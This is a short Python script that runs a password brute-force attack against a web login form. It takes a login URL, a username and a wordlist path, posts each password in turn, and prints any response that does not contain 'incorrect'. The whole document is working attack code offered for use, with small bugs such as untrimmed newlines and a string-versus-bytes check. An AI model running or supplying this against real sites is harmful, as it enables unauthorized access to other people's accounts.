#! /usr/bin/python
import requests
url = str(input("Enter the login URL: "))
user = input("Enter the username to conduct the Brute Force attack against: ")
file = input("Enter the password list location ex: '/usr/john/pass.txt': ")
passwords = open(file, "r").readlines()
for pw in passwords:
    postdata = {"username": user, "password": pw}
    x = requests.post(url, postdata)
    if not "incorrect" in x.content:
        print(x.content, pw)
